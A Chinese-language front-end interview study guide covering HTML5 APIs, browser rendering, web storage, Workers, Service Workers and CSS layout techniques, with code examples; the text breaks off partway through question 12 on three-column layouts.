# 前端开发面试题清单（100 题 · 详细答案）

> 涵盖 HTML/CSS、JavaScript 核心、ES6+、TypeScript、浏览器原理、网络、性能优化、安全、工程化、算法等全部高频考点。
> **不包含 Vue/React 框架相关内容**，专注于前端通用基础知识与进阶能力。
> 每道题均附带**详细代码示例**和**面试要点**。

---

## 目录

| 模块 | 内容 | 题号 |
|------|------|------|
| 一 | HTML 与 HTML5 API | 1 - 8 |
| 二 | CSS 核心与布局 | 9 - 17 |
| 三 | CSS 进阶与动画 | 18 - 22 |
| 四 | JavaScript 核心基础 | 23 - 32 |
| 五 | ES6+ 新特性 | 33 - 40 |
| 六 | 异步编程与事件循环 | 41 - 47 |
| 七 | TypeScript 核心 | 48 - 54 |
| 八 | 浏览器原理 | 55 - 63 |
| 九 | 网络与 HTTP | 64 - 70 |
| 十 | 性能优化 | 71 - 78 |
| 十一 | 前端安全 | 79 - 84 |
| 十二 | 前端工程化 | 85 - 92 |
| 十三 | 数据结构与算法 | 93 - 100 |

---

## 一、HTML 与 HTML5 API

### 1. HTML5 有哪些新特性？哪些已经过时了？

**⭐⭐⭐⭐ · 高频**

#### 新增特性

**语义化标签：**
```html
<header>     <!-- 页眉 -->
<nav>        <!-- 导航 -->
<main>       <!-- 主体内容 -->
<article>    <!-- 独立文章 -->
<section>    <!-- 内容分区 -->
<aside>      <!-- 侧边栏 -->
<footer>     <!-- 页脚 -->
<time>       <!-- 时间 -->
<figure>     <!-- 插图 -->
<figcaption> <!-- 插图标题 -->
```

**表单增强：**
```html
<!-- 新的 input 类型 -->
<input type="email" required>       <!-- 邮箱校验 -->
<input type="url">                 <!-- URL 校验 -->
<input type="number" min="0" max="100" step="5">
<input type="range" min="0" max="100">
<input type="date">                <!-- 日期选择器 -->
<input type="color">              <!-- 颜色选择器 -->
<input type="search">             <!-- 搜索框（自带清除按钮） -->

<!-- 新属性 -->
<input placeholder="请输入" autofocus>
<input autocomplete="off">
<input pattern="[A-Za-z]{3,}">
<input list="browsers">
<datalist id="browsers">
  <option value="Chrome">
  <option value="Firefox">
</datalist>
```

**多媒体：**
```html
<audio controls>
  <source src="audio.mp3" type="audio/mpeg">
  您的浏览器不支持 audio 标签
</audio>

<video controls width="640" poster="cover.jpg">
  <source src="video.mp4" type="video/mp4">
  <track src="subtitles.vtt" kind="subtitles" srclang="zh" label="中文">
</video>
```

**图形与绘图：**
```html
<canvas id="myCanvas" width="400" height="300"></canvas>
<svg width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>
```

**其他重要 API：**
```javascript
// 本地存储
localStorage.setItem('key', 'value')
sessionStorage.setItem('key', 'value')

// WebSocket
const ws = new WebSocket('ws://example.com/socket')
ws.onmessage = (event) => console.log(event.data)

// Web Worker
const worker = new Worker('worker.js')
worker.postMessage('data')
worker.onmessage = (e) => console.log(e.data)

// History API (SPA 路由基础)
history.pushState({ page: 1 }, '', '/page1')
history.replaceState({ page: 2 }, '', '/page2')
window.addEventListener('popstate', (e) => console.log(e.state))

// Geolocation
navigator.geolocation.getCurrentPosition(
  (pos) => console.log(pos.coords.latitude, pos.coords.longitude),
  (err) => console.error(err)
)

// Drag & Drop
element.draggable = true
element.ondragstart = (e) => e.dataTransfer.setData('text', e.target.id)
element.ondragover = (e) => e.preventDefault()
element.ondrop = (e) => {
  e.preventDefault()
  const id = e.dataTransfer.getData('text')
  element.appendChild(document.getElementById(id))
}
```

#### 已过时/不推荐使用的标签

| 标签 | 替代方案 |
|------|----------|
| `<center>` | CSS `text-align: center` / flexbox |
| `<font>` | CSS `font-family`, `font-size`, `color` |
| `<big>`, `<small>` | CSS `font-size` |
| `<bgsound>` | `<audio>` |
| `<marquee>` | CSS animation / JS |
| `<frame>`, `<frameset>` | `<iframe>` 或组件化 |
| `<applet>` | `<object>` 或 WebAssembly |
| `<acronym>` | `<abbr>` |

**面试要点：** 不仅要列举新特性，还要知道实际应用场景。比如 History API 是 SPA 路由的基石，Web Worker 用于 CPU 密集型任务避免阻塞主线程。

---

### 2. 什么是语义化 HTML？有什么好处？

**⭐⭐⭐**

```html
<!-- ❌ 非语义化：全是 div，毫无意义 -->
<div class="header">
  <div class="nav">
    <div class="nav-item" onclick="goPage()">首页</div>
  </div>
</div>
<div class="content">
  <div class="title">文章标题</div>
  <div class="body">文章内容...</div>
</div>
<div class="footer">版权信息</div>

<!-- ✅ 语义化：标签即含义 -->
<header>
  <nav>
    <a href="/">首页</a>
    <a href="/about">关于</a>
  </nav>
</header>
<main>
  <article>
    <h1>文章标题</h1>
    <p>文章内容...</p>
  </article>
</main>
<footer>
  <small>&copy; 2026 版权信息</small>
</footer>
```

#### 好处

| 维度 | 说明 |
|------|------|
| **SEO** | 搜索引擎理解页面结构，`<article>` 中的内容权重更高 |
| **可访问性 (A11y)** | 屏幕阅读器可解读页面结构，帮助视障用户导航 |
| **代码可维护性** | 开发者一眼看懂页面布局，不需要猜 class 含义 |
| **移动端阅读模式** | Safari 阅读模式依赖 `<article>`, `<h1>` 等标签提取内容 |
| **互操作性** | 爬虫、RSS 阅读器、浏览器插件可以更好地解析内容 |

#### 面试加分项：ARIA 增强语义

```html
<!-- 当原生 HTML 无法表达语义时，使用 ARIA -->
<div role="tablist">
  <button role="tab" aria-selected="true" aria-controls="panel-1">
    标签一
  </button>
  <button role="tab" aria-selected="false" aria-controls="panel-2">
    标签二
  </button>
</div>
<div role="tabpanel" id="panel-1">内容一</div>
<div role="tabpanel" id="panel-2" hidden>内容二</div>

<!-- 动态通知屏幕阅读器 -->
<div role="alert" aria-live="assertive">
  表单提交成功！
</div>
```

**面试要点：** 提到「ARIA 是语义化的补充，优先使用原生语义标签，原生无法表达时再用 ARIA」。

---

### 3. 从输入 URL 到页面渲染完成，发生了什么？

**⭐⭐⭐⭐⭐ · 必问 100%**

这是前端面试的"定海神针"题，能考察候选人对网络、浏览器、渲染等全链路知识的掌握。

```
完整流程（约 15 个关键步骤）
============================================

1. URL 解析
   ├─ 解析协议 (https)、域名、端口、路径、参数
   └─ 处理特殊字符编码

2. DNS 解析（域名 -> IP）
   ├─ 浏览器 DNS 缓存
   ├─ OS DNS 缓存 (hosts 文件)
   ├─ 路由器 DNS 缓存
   ├─ ISP DNS 服务器
   └─ 递归查询：根域名服务器 → 顶级域名 → 权威 DNS

3. TCP 连接（三次握手）
   ├─ SYN (客户端 → 服务器)
   ├─ SYN+ACK (服务器 → 客户端)
   └─ ACK (客户端 → 服务器)

4. TLS 握手（HTTPS）
   ├─ ClientHello (支持的加密套件)
   ├─ ServerHello + 证书 + ServerKeyExchange
   ├─ ClientKeyExchange + ChangeCipherSpec
   └─ 建立加密通道

5. 发送 HTTP 请求
   ├─ 请求行 (GET /index.html HTTP/1.1)
   ├─ 请求头 (Cookie, User-Agent, Accept 等)
   └─ 请求体 (POST 时有)

6. 服务器处理请求
   ├─ 反向代理 (Nginx)
   ├─ 应用服务器处理
   └─ 返回 HTTP 响应

7. 浏览器接收响应
   ├─ 响应行 (HTTP/1.1 200 OK)
   ├─ 响应头 (Content-Type, Cache-Control 等)
   └─ 响应体 (HTML 文档)

8. 解析 HTML → DOM 树
   ├─ 字节 → 字符 → Token → 节点 → DOM 树
   ├─ 遇到 CSS 阻塞渲染，但不阻塞 DOM 解析
   └─ 遇到 JS 阻塞 DOM 解析（除非 async/defer）

9. 解析 CSS → CSSOM 树
   └─ 与 DOM 解析并行，但会阻塞渲染树

10. 执行 JavaScript
    ├─ 普通 script：阻塞 DOM 解析
    ├─ async script：异步下载，下载完立即执行
    └─ defer script：异步下载，DOM 解析完后按顺序执行

11. 构建渲染树 (Render Tree)
    └─ DOM + CSSOM → 渲染树（只包含可见节点）

12. 布局 / 回流 (Layout / Reflow)
    └─ 计算每个节点的精确位置和大小

13. 绘制 (Paint)
    └─ 将渲染树转换为屏幕上的像素

14. 合成 (Composite)
    ├─ 分层（从文档流分离）
    ├─ 合成线程独立处理 transform/opacity
    └─ 不触发重排重绘时走合成路径

15. 断开连接
    └─ 四次挥手关闭 TCP 连接
```

#### 关键优化点

```javascript
// 1. DNS 预解析
<link rel="dns-prefetch" href="//api.example.com">

// 2. TCP 预连接
<link rel="preconnect" href="//api.example.com">

// 3. 资源预加载
<link rel="preload" href="critical.css" as="style">
<link rel="prefetch" href="next-page.js">

// 4. 减少 CSS 阻塞
<!-- critical CSS 内联 -->
<style>/* 首屏关键 CSS */</style>
<!-- 非关键 CSS 异步加载 -->
<link rel="preload" href="non-critical.css" as="style" onload="this.rel='stylesheet'">

// 5. 合理使用 async/defer
<script defer src="app.js"></script>       <!-- 不阻塞，按序执行 -->
<script async src="analytics.js"></script> <!-- 不阻塞，不保证顺序 -->
```

**面试要点：** 这道题没有标准长度，面高级岗要能讲到 DNS/TCP/渲染树/合成层/GUP 加速等深度内容。

---

### 4. script 标签的 async 和 defer 有什么区别？

**⭐⭐⭐⭐ · 高频**

```html
<!-- 1. 普通 script：阻塞一切 -->
<script src="a.js"></script>
<!-- DOM 解析停止 → 下载 a.js → 执行 a.js → 继续 DOM 解析 -->

<!-- 2. async：异步下载，立即执行 -->
<script src="a.js" async></script>
<!-- 并行下载 a.js → 下载完立即执行（暂停 DOM 解析）→ 继续 DOM 解析 -->

<!-- 3. defer：异步下载，延迟执行 -->
<script src="a.js" defer></script>
<!-- 并行下载 a.js → DOM 完全解析后 → 按顺序执行 -->
```

#### 图解对比

```
普通 script:
HTML 解析  [----暂停---- 下载+执行  ----继续解析----]
                      ↓
                   等待中...

async:
HTML 解析  [------------解析-------------]
下载       [----下载----]
执行       [暂停][执行完][继续解析]

defer:
HTML 解析  [------------完整解析-------------]
下载       [----下载----]
执行                      [执行]
```

#### 对比表

| 特性 | 普通 | async | defer |
|------|------|-------|-------|
| 下载时机 | 遇到标签立即下载 | 异步并行下载 | 异步并行下载 |
| 阻塞 DOM 解析 | ✅ 阻塞 | 执行时阻塞 | ❌ 不阻塞 |
| 执行时机 | 下载后立即执行 | 下载后立即执行 | DOM 解析完毕后执行 |
| 执行顺序 | 按出现顺序 | 不保证顺序 | 按出现顺序 |
| DOMContentLoaded | 等待 | 不等待（可能早或晚） | 在执行前触发 |
| 适用场景 | 必须同步加载 | 独立脚本（统计、广告） | 应用主脚本 |

```javascript
// 实践场景选择
// async：独立第三方脚本
<script async src="https://www.googletagmanager.com/gtag/js"></script>

// defer：应用逻辑代码（需要 DOM 和顺序）
<script defer src="/js/vendor.js"></script>
<script defer src="/js/app.js"></script>

// 普通：必须在页面渲染前执行的脚本
<script>
  // 防止页面闪烁（设置暗色主题等）
  document.documentElement.setAttribute('data-theme', 'dark')
</script>
```

**面试要点：** 画时间线是加分项。要能说清楚 async 和 defer 对 `DOMContentLoaded` 事件的影响。

---

### 5. HTML5 本地存储方案有哪些？Cookie、localStorage、sessionStorage、IndexedDB 的区别？

**⭐⭐⭐⭐ · 高频**

```javascript
// ===== Cookie =====
// 特点：每次 HTTP 请求自动携带，大小 4KB，可设置过期时间
document.cookie = 'username=张三; max-age=86400; path=/; secure; samesite=strict'
// 读取时需手动解析
const parseCookie = () =>
  Object.fromEntries(document.cookie.split('; ').map(c => c.split('=')))

// ===== localStorage =====
// 特点：持久化存储，关闭浏览器不丢失，大小约 5MB，同源共享
localStorage.setItem('theme', 'dark')
localStorage.getItem('theme')           // 'dark'
localStorage.removeItem('theme')
localStorage.clear()
// 只能存字符串，对象需序列化
localStorage.setItem('user', JSON.stringify({ name: '张三' }))
JSON.parse(localStorage.getItem('user'))

// 跨 tab 通信
window.addEventListener('storage', (e) => {
  console.log(e.key, e.oldValue, e.newValue) // 其他 tab 修改时触发
})

// ===== sessionStorage =====
// 特点：会话级存储，关闭 tab 即清除，大小约 5MB，不同 tab 隔离
sessionStorage.setItem('formDraft', '草稿内容')

// ===== IndexedDB =====
// 特点：异步、支持索引、可存大量结构化数据、支持事务
// 适用于离线应用、大量数据缓存

// 打开数据库
const request = indexedDB.open('MyDB', 1)

request.onupgradeneeded = (e) => {
  const db = e.target.result
  // 创建对象仓库和索引
  const store = db.createObjectStore('users', { keyPath: 'id', autoIncrement: true })
  store.createIndex('name', 'name', { unique: false })
  store.createIndex('email', 'email', { unique: true })
}

request.onsuccess = (e) => {
  const db = e.target.result
  // 事务写入
  const tx = db.transaction('users', 'readwrite')
  const store = tx.objectStore('users')
  store.add({ name: '张三', email: 'zhangsan@example.com', age: 25 })

  tx.oncomplete = () => console.log('写入完成')
  tx.onerror = () => console.error('写入失败')
}

// 批量查询
const getAll = () => {
  const tx = db.transaction('users', 'readonly')
  const store = tx.objectStore('users')
  const request = store.getAll()
  request.onsuccess = () => console.log(request.result)
}

// ===== Cache API (Service Worker) =====
// 缓存 HTTP 请求/响应，用于 PWA 离线
caches.open('v1').then(cache => {
  cache.add('/index.html')
  cache.addAll(['/style.css', '/script.js', '/logo.png'])
})
caches.match('/index.html').then(response => {
  // 缓存命中，直接返回
})
```

#### 对比总表

| 维度 | Cookie | localStorage | sessionStorage | IndexedDB |
|------|--------|--------------|----------------|-----------|
| 容量 | ~4KB | ~5MB | ~5MB | 几百MB+ |
| 有效期 | 可设过期时间 | 永久 | 关闭 tab | 永久 |
| 作用域 | 同源+path | 同源 | 同源+同 tab | 同源 |
| 请求携带 | ✅ 自动携带 | ❌ | ❌ | ❌ |
| API 类型 | 字符串，解析繁琐 | 同步，简单 key-value | 同步，简单 key-value | 异步，NoSQL |
| 存储类型 | 字符串 | 字符串 | 字符串 | 任意（结构化克隆） |
| 场景 | 身份标识、少量数据 | 主题设置、用户偏好 | 表单草稿、临时状态 | 离线数据、大数据量 |

```javascript
// ===== 典型场景选择 =====
// 用户登录 Token → Cookie (HttpOnly + Secure + SameSite) 或 localStorage
// 用户偏好设置 → localStorage
// 表单草稿 → sessionStorage
// 离线 PWA 数据 → IndexedDB + Cache API
// 跨页面临时通信 → sessionStorage + storage 事件 或 BroadcastChannel
```

**面试要点：** Cookie 的 `HttpOnly`（防 XSS 读取）、`Secure`（仅 HTTPS）、`SameSite`（防 CSRF）三个安全属性是高频追问。

---

### 6. 什么是 Web Worker？什么场景使用？

**⭐⭐⭐**

```javascript
// ===== 主线程 (main.js) =====
// 创建 Worker
const worker = new Worker('worker.js')

// 发送数据给 Worker
worker.postMessage({ type: 'compute', data: largeArray })

// 接收 Worker 的计算结果
worker.onmessage = (e) => {
  console.log('计算结果:', e.data.result)
  // 更新 UI
  updateChart(e.data.result)
}

// 错误处理
worker.onerror = (e) => {
  console.error('Worker 错误:', e.message)
}

// 终止 Worker
worker.terminate()

// ===== Worker 线程 (worker.js) =====
// self 代表 Worker 全局作用域
self.onmessage = (e) => {
  const { type, data } = e.data

  if (type === 'compute') {
    // 执行 CPU 密集型计算（不阻塞主线程）
    const result = heavyComputation(data)
    self.postMessage({ result })
  }
}

function heavyComputation(arr) {
  // 大数据排序、加密、图像处理等
  return arr.sort((a, b) => a - b).map(x => x * 2)
}

// Worker 内部也可以通过 importScripts 加载库
importScripts('https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js')
// 现在可以使用 _ 了

// Worker 内也可以创建子 Worker
// const subWorker = new Worker('sub-worker.js')
```

#### Shared Worker（多 tab 共享）

```javascript
// ===== shared-worker.js =====
const connections = []

self.onconnect = (e) => {
  const port = e.ports[0]
  connections.push(port)

  port.onmessage = (event) => {
    // 一个 tab 发来的消息，广播给所有 tab
    connections.forEach(p => p.postMessage(event.data))
  }
}

// ===== 各 tab 页面 =====
const worker = new SharedWorker('shared-worker.js')
worker.port.start()
worker.port.postMessage('来自 tab A 的消息')
worker.port.onmessage = (e) => console.log(e.data)
```

#### 应用场景

| 场景 | 说明 |
|------|------|
| **CPU 密集计算** | 大数据排序、筛选、聚合、加密解密 |
| **图像/视频处理** | Canvas 像素操作、图像滤镜、视频帧提取 |
| **实时数据分析** | WebSocket 数据流处理、高频交易数据 |
| **PWA 离线处理** | Service Worker（一种特殊的 Worker） |
| **代码编辑器** | 语法高亮、代码分析、linter 运行 |
| **Excel 处理** | 大文件解析、公式计算 |

#### 限制

```javascript
// Worker 不能做的事情
// ❌ 不能访问 DOM: document.getElementById('xxx')
// ❌ 不能访问 window 对象的大部分属性
// ❌ 不能直接调用 alert/confirm
// ✅ 可以访问: navigator, fetch, WebSocket, setTimeout, IndexedDB
// ✅ 通信方式: postMessage (结构化克隆，Transferable Objects 优化)

// Transferable Objects（零拷贝传输大对象）
const buffer = new ArrayBuffer(1024 * 1024 * 100) // 100MB
worker.postMessage({ buffer }, [buffer]) // 转移所有权，主线程不能再使用
```

**面试要点：** 提 `Transferable Objects` 表示你了解零拷贝优化。提及 `Comlink` 等库（让 Worker 通信像普通函数调用）是加分项。

---

### 7. 如何实现跨标签页通信？

**⭐⭐⭐**

```javascript
// 方式 1: localStorage + storage 事件（最常用）
// Tab A
localStorage.setItem('msg', JSON.stringify({ from: 'tab-a', data: 'hello' }))

// Tab B（监听其他 tab 的写入）
window.addEventListener('storage', (e) => {
  if (e.key === 'msg') {
    console.log('收到:', JSON.parse(e.newValue))
  }
})
// ⚠️ 注意：storage 事件只在其他 tab 写入时触发，同一 tab 不触发

// 方式 2: BroadcastChannel API（现代方案，推荐）
// 所有 tab 都执行相同的代码
const channel = new BroadcastChannel('my-channel')

// 发送消息
channel.postMessage({ type: 'GET_USER', payload: '123' })

// 接收消息
channel.onmessage = (e) => {
  console.log('广播收到:', e.data)
}

// 关闭
channel.close()

// 方式 3: SharedWorker
// 见上一题 —— 适合需要共享状态的场景

// 方式 4: Service Worker + postMessage
// Tab A 发送给 Service Worker
navigator.serviceWorker.controller.postMessage({ type: 'notify', data: '更新了' })

// Service Worker 转发给所有客户端
self.clients.matchAll().then(clients => {
  clients.forEach(client => client.postMessage({ data: '数据已更新' }))
})

// 各 tab 接收
navigator.serviceWorker.addEventListener('message', (e) => {
  console.log('SW 发来:', e.data)
})

// 方式 5: window.postMessage（跨域 iframe 通信）
// 父页面
iframe.contentWindow.postMessage('hello', 'https://other-domain.com')

// iframe 内部
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://parent-domain.com') return // 安全检查
  console.log('父页面发来:', e.data)
})

// 方式 6: WebSocket（跨设备通信）
// 天然支持多 tab，但需要服务器

// 方式 7: IndexedDB + polling（兼容老浏览器）
// 不推荐，性能和复杂度都差
```

#### 方案对比

| 方案 | 同源 | 跨域 | 实时性 | 复杂度 | 推荐 |
|------|------|------|--------|--------|------|
| localStorage + storage | ✅ | ❌ | 即时 | 低 | ⭐⭐⭐⭐ |
| BroadcastChannel | ✅ | ❌ | 即时 | 低 | ⭐⭐⭐⭐⭐ |
| SharedWorker | ✅ | ❌ | 即时 | 中 | ⭐⭐⭐ |
| Service Worker | ✅ | ❌ | 即时 | 高 | ⭐⭐⭐ |
| postMessage | ✅ | ✅ | 即时 | 中 | ⭐⭐⭐⭐ |
| WebSocket | ✅ | ✅ | 即时 | 中（需服务器） | ⭐⭐⭐ |

**面试要点：** 先区分场景——同源推荐 BroadcastChannel，跨域用 postMessage，需要服务器用 WebSocket。

---

### 8. 什么是 Service Worker？生命周期是什么？

**⭐⭐⭐**

```javascript
// ===== 注册 Service Worker (main.js) =====
if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
      .then(reg => console.log('SW 注册成功:', reg.scope))
      .catch(err => console.error('SW 注册失败:', err))
  })

  // 监听更新
  navigator.serviceWorker.addEventListener('controllerchange', () => {
    console.log('新的 SW 已接管页面')
  })
}

// ===== Service Worker 文件 (sw.js) =====
const CACHE_NAME = 'my-app-v1'
const ASSETS = ['/', '/index.html', '/styles.css', '/app.js']

// 1. install —— 安装阶段，预缓存关键资源
self.addEventListener('install', (event) => {
  console.log('SW installing...')
  // skipWaiting 跳过等待，立即激活
  // self.skipWaiting()

  event.waitUntil(
    caches.open(CACHE_NAME).then(cache => {
      return cache.addAll(ASSETS)
    })
  )
})

// 2. activate —— 激活阶段，清理旧缓存
self.addEventListener('activate', (event) => {
  console.log('SW activated')
  // 立即接管所有页面
  // self.clients.claim()

  event.waitUntil(
    caches.keys().then(keys => {
      return Promise.all(
        keys.filter(key => key !== CACHE_NAME)
          .map(key => caches.delete(key))
      )
    })
  )
})

// 3. fetch —— 拦截网络请求（核心功能）
self.addEventListener('fetch', (event) => {
  // 缓存策略：Cache First（适合静态资源）
  event.respondWith(
    caches.match(event.request).then(cached => {
      // 缓存命中 + 后台更新
      if (cached) {
        fetch(event.request).then(res => {
          caches.open(CACHE_NAME).then(cache =>
            cache.put(event.request, res.clone())
          )
        })
        return cached
      }
      // 缓存未命中，走网络
      return fetch(event.request)
    })
  )
})

// 4. push —— 接收推送消息
self.addEventListener('push', (event) => {
  const data = event.data.json()
  self.registration.showNotification(data.title, {
    body: data.body,
    icon: '/icon-192.png',
    badge: '/badge-72.png',
    data: { url: data.url }
  })
})

// 5. sync —— 后台同步（网络恢复后发送数据）
self.addEventListener('sync', (event) => {
  if (event.tag === 'sync-messages') {
    event.waitUntil(syncPendingMessages())
  }
})
```

#### 完整生命周期

```
                                      ┌──────────┐
                                      │ 空闲      │
                                      └────┬─────┘
                                           │
                                ┌──────────▼──────────┐
           register() 注册      │  installing         │
                                │  (install 事件)     │
                                └──────────┬──────────┘
                                           │ install 完成
                                ┌──────────▼──────────┐
                                │  installed/waiting  │ ← skipWaiting() 跳过
                                │  (等待旧 SW 释放)   │
                                └──────────┬──────────┘
                                           │ 旧 SW 释放 / 首次无旧 SW
                                ┌──────────▼──────────┐
                                │  activating         │
                                │  (activate 事件)    │
                                └──────────┬──────────┘
                                           │ activate 完成 + clients.claim()
                                ┌──────────▼──────────┐
                                │  activated          │
                                │  (接管页面，监听    │
                                │   fetch/push/sync)  │
                                └──────────┬──────────┘
                                           │ 无 tab 使用 / 浏览器回收
                                ┌──────────▼──────────┐
                                │  redundant (废弃)   │
                                └─────────────────────┘
```

#### 缓存策略

```javascript
// 策略 1: Cache First（静态资源）
// 缓存优先，适合不常变的资源（字体、图片、CSS/JS 带 hash）
caches.match(request).then(cached => cached || fetch(request))

// 策略 2: Network First（API 数据）
// 网络优先，网络失败用缓存兜底
fetch(request).catch(() => caches.match(request))

// 策略 3: Stale While Revalidate（平衡策略）
// 先返回缓存，同时后台更新缓存
caches.match(request).then(cached => {
  const fetchPromise = fetch(request).then(res => {
    caches.open(CACHE_NAME).then(cache => cache.put(request, res.clone()))
    return res
  })
  return cached || fetchPromise
})

// 策略 4: Network Only
// 只用网络（实时数据）
fetch(request)

// 策略 5: Cache Only
// 只用缓存（离线优先应用）
caches.match(request)
```

**面试要点：** Service Worker 是 PWA 的核心。面试官会追问缓存策略、更新机制、安全问题（仅 HTTPS/localhost）。

---



## 二、CSS 核心与布局

### 9. CSS 盒模型是什么？border-box 和 content-box 的区别？

**⭐⭐⭐⭐⭐ · 必问**

```
┌─────────────────────────────────────┐
│          margin (外边距)            │
│  ┌───────────────────────────────┐  │
│  │       border (边框)           │  │
│  │  ┌─────────────────────────┐  │  │
│  │  │     padding (内边距)     │  │  │
│  │  │  ┌───────────────────┐  │  │  │
│  │  │  │   content (内容)   │  │  │  │
│  │  │  │                   │  │  │  │
│  │  │  └───────────────────┘  │  │  │
│  │  └─────────────────────────┘  │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

```css
/* ===== content-box (默认) ===== */
/* width = content 宽度 */
/* 实际占用 = content + padding + border */
.box-content {
  box-sizing: content-box;
  width: 200px;
  padding: 20px;
  border: 5px solid #333;
  /* 实际渲染宽度 = 200 + 20*2 + 5*2 = 250px */
}

/* ===== border-box (推荐) ===== */
/* width = content + padding + border */
/* 实际占用 = width */
.box-border {
  box-sizing: border-box;
  width: 200px;
  padding: 20px;
  border: 5px solid #333;
  /* 实际渲染宽度 = 200px */
  /* content 被压缩为 200 - 20*2 - 5*2 = 150px */
}
```

```css
/* ⭐ 全局设置 border-box 是最佳实践 */
*,
*::before,
*::after {
  box-sizing: border-box;
}
```

**面试要点：** 说出 border-box 的好处——布局更好控制，width 是多少就占多大空间，不会因为加 padding 撑破布局。这几乎是所有 reset CSS 的标配。

---

### 10. BFC（块级格式化上下文）是什么？如何创建？有什么作用？

**⭐⭐⭐⭐ · 高频**

BFC 是一个独立的渲染区域，内部布局不会影响外部元素。

```css
/* ===== 创建 BFC 的方式 ===== */
.bfc-element {
  /* 方式 1: float 不为 none */
  float: left;

  /* 方式 2: position 为 absolute 或 fixed */
  position: absolute;

  /* 方式 3: display 为 inline-block / table-cell / table-caption / flex / grid */
  display: inline-block;
  display: flex;

  /* 方式 4: overflow 不为 visible（最常用！）*/
  overflow: hidden;
  overflow: auto;

  /* 方式 5: contain 属性 */
  contain: layout;
  contain: paint;
}
```

#### BFC 的应用场景

```css
/* 场景 1: 解决外边距折叠 */
.container { overflow: hidden; /* 创建 BFC */ }
.blue { margin-bottom: 30px; }
.red { margin-top: 20px; }
/* 没有 BFC: 两个 margin 折叠为 30px */
/* 有 BFC:   各自独立，间距 50px */

/* 场景 2: 清除浮动（清除内部浮动的影响）*/
.parent {
  border: 1px solid #333;
  overflow: hidden; /* 创建 BFC，撑开高度包含浮动子元素 */
}
.child {
  float: left;
  width: 100px;
  height: 100px;
}

/* 场景 3: 防止被浮动元素覆盖（自适应两栏布局）*/
.left {
  float: left;
  width: 200px;
}
.right {
  overflow: hidden; /* 创建 BFC，不与 float 元素重叠 */
}
```

```html
<!-- BFC 布局示例 -->
<div class="left" style="float:left;width:200px;height:300px;background:blue">
  左侧浮动
</div>
<div class="right" style="overflow:hidden;height:300px;background:red">
  右侧 BFC —— 自适应剩余宽度，不与左侧重叠
</div>
```

**面试要点：** 把 BFC 记成"CSS 中的一个小国家，里面的规矩和外面无关"。三个核心作用：阻止 margin 合并、清除浮动、防止与 float 重叠。

---

### 11. 如何实现水平垂直居中？列举所有方法。

**⭐⭐⭐⭐ · 高频**

```css
/* ===== 方式 1: Flexbox（现代首选）===== */
.parent {
  display: flex;
  justify-content: center;
  align-items: center;
}

/* ===== 方式 2: Grid（同样简单）===== */
.parent {
  display: grid;
  place-items: center; /* justify-items + align-items 的简写 */
}

/* ===== 方式 3: 绝对定位 + transform（不需要知道尺寸）===== */
.parent { position: relative; }
.child {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}

/* ===== 方式 4: 绝对定位 + margin:auto（需知道尺寸）===== */
.parent { position: relative; }
.child {
  position: absolute;
  top: 0; left: 0; right: 0; bottom: 0;
  width: 200px;
  height: 100px;
  margin: auto;
}

/* ===== 方式 5: 绝对定位 + 负 margin（知道尺寸）===== */
.parent { position: relative; }
.child {
  position: absolute;
  top: 50%;
  left: 50%;
  width: 200px;
  height: 100px;
  margin-left: -100px; /* 负一半宽度 */
  margin-top: -50px;   /* 负一半高度 */
}

/* ===== 方式 6: table-cell（古老但兼容最好）===== */
.parent {
  display: table-cell;
  vertical-align: middle;
  text-align: center;
}
.child { display: inline-block; }

/* ===== 方式 7: 行内块 + 伪元素（垂直居中）===== */
.parent { text-align: center; }
.parent::before {
  content: '';
  display: inline-block;
  height: 100%;
  vertical-align: middle;
}
.child { display: inline-block; vertical-align: middle; }

/* ===== 方式 8: 纯文本（单行文本）===== */
.single-line {
  height: 40px;
  line-height: 40px; /* height == line-height */
  text-align: center;
}
```

| 方法 | 需要知道尺寸 | 兼容性 | 推荐度 |
|------|-------------|--------|--------|
| Flexbox | ❌ | IE10+ | ⭐⭐⭐⭐⭐ |
| Grid | ❌ | 现代浏览器 | ⭐⭐⭐⭐⭐ |
| absolute + transform | ❌ | IE9+ | ⭐⭐⭐⭐ |
| absolute + margin:auto | ✅ | IE8+ | ⭐⭐⭐ |
| absolute + 负 margin | ✅ | IE6+ | ⭐⭐ |
| table-cell | ❌ | IE8+ | ⭐⭐ |
| line-height | 单行文本 | 全兼容 | ⭐⭐⭐ |

**面试要点：** 至少说出 Flexbox、Grid、绝对定位+transform 三种。强调「不知道子元素尺寸时用 transform」是关键。

---

### 12. 如何实现三栏布局？两边固定，中间自适应。

**⭐⭐⭐⭐ · 高频**

```css
/* ===== 方式 1: Flexbox（推荐）===== */
.container {
  display: flex;
}
.left {
  width: 200px;
  background: #f00;
}
.center {
  flex: 1;
  background: #0f0;
}
.right {
  width: 200px;
  background: #00f;
}

/* ===== 方式 2: Grid（更简洁）===== */
.container {
  display: grid;
  grid-template-columns: 200px 1fr 200px;
}

/* ===== 方式 3: float（经典方案）===== */
.left {
  float: left;
  width: 200px;
}
.right {
  float: right;
  width: 200px;
}
.center {
  overflow: hidden; /* 创建 BFC，自适应 */
  /* 或 margin: 0 200px */
}

/* ===== 方式 4: 绝对定位 ===== */
.container { position: relative; }
.left {
  position: absolute;
  left: 0;
  width: 200px;
}
.right {
  position: absolute;
  right: 0;
  width: 200px;
}
.center {
  margin: 0 200px;
}

/* ===== 方式 5: calc ===== */
.left { float: left; width: 200px; }
.right { float: right; width: 200px; }
.center {
  float: left;
  width: calc(100% - 400px);
}

/* ===== 方式 6: 圣杯布局（古老但常问）===== */
/* HTML 结构: center 在前，left/right 在后，利于 SEO */
.container {
  padding: 0 200px; /* 留出左右空间 */
}
.center {
  float: left;
  width: 100%;
  background: #0f0;
}
.left {
  float: left;
  width: 200px;
  margin-left: -100%;     /* 移到上一层行的最左边 */
  position: relative;
  left: -200px;            /* 再左移自身宽度 */
}
.right {
  float: left;
  width: 200px;
  margin-left: -200px;     /* 移到上一层行的最右边 */
  position: relative;
  right: -200px;
}

/* ===== 方式 7: 双飞翼布局（淘宝方案）===== */
/* center 内部多加一层 wrapper */
.center {
  float: left;
  width: 100%;
}
.center-wrapper {
  margin: 0 200px; /* 给两侧留空间 */
}
.left {
  float: left;
  width: 200px;
